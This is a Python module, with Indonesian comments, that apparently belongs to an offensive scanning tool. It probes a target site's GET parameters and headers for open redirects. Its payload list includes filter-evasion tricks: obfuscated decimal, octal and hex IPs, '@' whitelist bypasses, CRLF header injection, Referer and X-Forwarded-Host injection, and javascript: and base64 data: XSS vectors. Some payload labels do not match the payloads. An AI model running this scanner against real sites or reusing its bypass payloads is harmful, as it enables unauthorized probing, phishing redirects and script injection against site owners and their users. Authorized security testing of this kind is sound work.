import requests
import urllib.parse
import copy
import re
import socket
from colorama import Fore, Style

class OpenRedirectEngine:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
        self.session.headers = {
            'User-Agent': 'ZeroBurst-RedirectHunter/16.0 (Deep-Inspect)',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }
        self.session.max_redirects = 0 # Wajib 0 untuk menangkap 301/302
        
        self.parsed = urllib.parse.urlparse(target_url)
        self.params = urllib.parse.parse_qs(self.parsed.query)
        self.base_url = target_url.split("?")[0]
        self.domain = self.parsed.netloc
        
        # TARGET VERIFIKASI (Google)
        self.dest_domain = "www.google.com"
        self.dest_ip = "216.58.214.14" # IP Google

    def generate_advanced_payloads(self):
        """Menghasilkan payload bypass tingkat tinggi"""
        payloads = []
        t = self.dest_domain
        
        # 1. BASIC SCHEME
        payloads.append({'type': 'Standard', 'pay': f"http://{t}"})
        payloads.append({'type': 'Protocol Relative', 'pay': f"//{t}"})
        
        # 2. OBFUSCATED IP ADDRESS (Bypass Filter String/Regex)
        # Decimal IP (216.58.214.14 -> 3627730446)
        payloads.append({'type': 'IP Obfuscation (Decimal)', 'pay': "http://3627730446"})
        # Octal IP
        payloads.append({'type': 'IP Obfuscation (Octal)', 'pay': "http://0330.072.0326.016"})
        # Hex IP
        payloads.append({'type': 'IP Obfuscation (Hex)', 'pay': "http://0xd83ad60e"})
        # Dword (Mixed)
        payloads.append({'type': 'IP Obfuscation (Dword)', 'pay': "http://216.58.54798"})

        # 3. SPECIAL CHARACTERS & EVASION
        payloads.append({'type': 'Backslash Bypass', 'pay': f"https:/{t}"})
        payloads.append({'type': 'Backslash Mixed', 'pay': f"https:/\/{t}"})
        payloads.append({'type': 'URL Encoded Dot', 'pay': f"http://{t}%2ecom"})
        payloads.append({'type': 'CRLF Injection', 'pay': f"/%0d%0aLocation:http://{t}"})
        payloads.append({'type': 'Whitespace Trick', 'pay': f"http:// {t}"})
        
        # 4. WHITELIST BYPASS (Memanfaatkan nama domain target)
        # Contoh: target.com@google.com (Browser akan ke Google, login as target.com)
        payloads.append({'type': 'Credential Portion (@)', 'pay': f"https://{self.domain}@{t}"})
        payloads.append({'type': 'Subdomain Trick', 'pay': f"https://{t}.{self.domain}"}) # kadang subdomain dibolehkan
        payloads.append({'type': 'Dotless Domain', 'pay': f"http://{t}."})

        # 5. DATA / JAVASCRIPT SCHEME (XSS via Redirect)
        payloads.append({'type': 'Javascript Scheme', 'pay': "javascript:alert(1)"})
        payloads.append({'type': 'Data Scheme', 'pay': "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="})

        return payloads

    def check_response_for_redirect(self, res, payload_type):
        """
        Menganalisis respon: Header Location, Meta Refresh, dan JS Redirect.
        """
        is_vuln = False
        evidence = ""
        tech = ""

        # A. HTTP HEADER LOCATION (301, 302, 303, 307, 308)
        if 300 <= res.status_code < 400:
            if 'Location' in res.headers:
                loc = res.headers['Location']
                # Cek apakah kita dilempar ke Google atau Script alert
                if self.dest_domain in loc or self.dest_ip in loc or "javascript:" in loc or "3627730446" in loc:
                    is_vuln = True
                    evidence = f"Header Location: {loc}"
                    tech = "Server-Side (HTTP 3xx)"

        # B. CLIENT-SIDE REDIRECT (200 OK tapi ada script redirect)
        if not is_vuln and res.status_code == 200:
            content = res.text.lower()
            
            # 1. Meta Refresh Analysis
            # <meta http-equiv="refresh" content="0;url=http://google.com">
            meta_match = re.search(r'content=["\']\d+;url=(.*?)["\']', content)
            if meta_match:
                url_dest = meta_match.group(1)
                if self.dest_domain in url_dest:
                    is_vuln = True
                    evidence = f"Meta Refresh Tag: {url_dest}"
                    tech = "Client-Side (Meta Tag)"

            # 2. JavaScript Location Analysis
            # window.location = "http://google.com"
            if not is_vuln:
                js_patterns = [
                    r'window\.location\s*=\s*["\'](.*?)["\']',
                    r'window\.location\.href\s*=\s*["\'](.*?)["\']',
                    r'window\.location\.replace\(["\'](.*?)["\']\)',
                    r'top\.location\s*=\s*["\'](.*?)["\']'
                ]
                for pattern in js_patterns:
                    js_match = re.search(pattern, content)
                    if js_match:
                        url_dest = js_match.group(1)
                        if self.dest_domain in url_dest:
                            is_vuln = True
                            evidence = f"JS Location: {url_dest}"
                            tech = "Client-Side (DOM Based)"
                            break

        return is_vuln, evidence, tech

    def run_scan(self):
        print(f"\n{Fore.CYAN}[*] MODULE START: Deep Open Redirect Hunter (Expert Edition){Style.RESET_ALL}")
        print(f"{Fore.WHITE}[*] Target: {Fore.GREEN}{self.target}")
        
        # 1. PARAMETER SCAN
        if self.params:
            payloads = self.generate_advanced_payloads()
            print(f"{Fore.YELLOW}[+] Testing {len(payloads)} advanced vectors on {len(self.params)} parameters...{Style.RESET_ALL}")
            
            for param, values in self.params.items():
                print(f"\n{Fore.WHITE}>>> Inspecting Parameter: {Fore.GREEN}'{param}'{Style.RESET_ALL}")
                vuln_found = False
                
                for p in payloads:
                    if vuln_found: break
                    
                    # Construct Attack URL
                    new_params = copy.deepcopy(self.params)
                    new_params[param] = [p['pay']]
                    
                    # Technique: Parameter Pollution (?next=google&next=google)
                    # Ini kadang membingungkan WAF
                    if "Pollution" in p['type']:
                        query = f"{param}={p['pay']}&{param}={p['pay']}" # Manual string construction
                        attack_url = f"{self.base_url}?{query}"
                    else:
                        query = urllib.parse.urlencode(new_params, doseq=True)
                        attack_url = f"{self.base_url}?{query}"

                    try:
                        res = self.session.get(attack_url, allow_redirects=False, timeout=8)
                        is_vuln, proof, tech = self.check_response_for_redirect(res, p['type'])
                        
                        if is_vuln:
                            print(f"   {Fore.RED}[CRITICAL] OPEN REDIRECT CONFIRMED!{Style.RESET_ALL}")
                            print(f"   ├── Payload   : {Fore.YELLOW}{p['pay']}{Style.RESET_ALL}")
                            print(f"   ├── Technique : {p['type']} ({tech})")
                            print(f"   └── Proof     : {Fore.MAGENTA}{proof}{Style.RESET_ALL}")
                            vuln_found = True
                    except:
                        pass
        else:
            print(f"{Fore.RED}[!] No GET parameters found. Skipping Parameter Scan.")

        # 2. HEADER BASED REDIRECT SCAN (New Deep Feature)
        print(f"\n{Fore.YELLOW}[+] Testing Header-Based Redirection (Referer/Host)...{Style.RESET_ALL}")
        try:
            # Banyak site redirect user kembali ke 'Referer' setelah login/logout
            # Kita manipulasi Referer
            headers_attack = {
                'Referer': 'http://www.google.com',
                'X-Forwarded-Host': 'www.google.com'
            }
            res_head = self.session.get(self.target, headers=headers_attack, allow_redirects=False, timeout=5)
            
            is_vuln, proof, tech = self.check_response_for_redirect(res_head, "Header Injection")
            if is_vuln:
                print(f"   {Fore.RED}[CRITICAL] HEADER-BASED REDIRECT DETECTED!{Style.RESET_ALL}")
                print(f"   ├── Vector    : Referer / X-Forwarded-Host Injection")
                print(f"   └── Proof     : {proof}")
            else:
                print(f"   {Fore.GREEN}[OK] Headers appear safe.{Style.RESET_ALL}")
                
        except:
            pass

        print("-" * 60)
        print(f"{Fore.CYAN}[*] Redirect Scan Completed.{Style.RESET_ALL}")

def run_redirect_scan(url):
    engine = OpenRedirectEngine(url)
    engine.run_scan()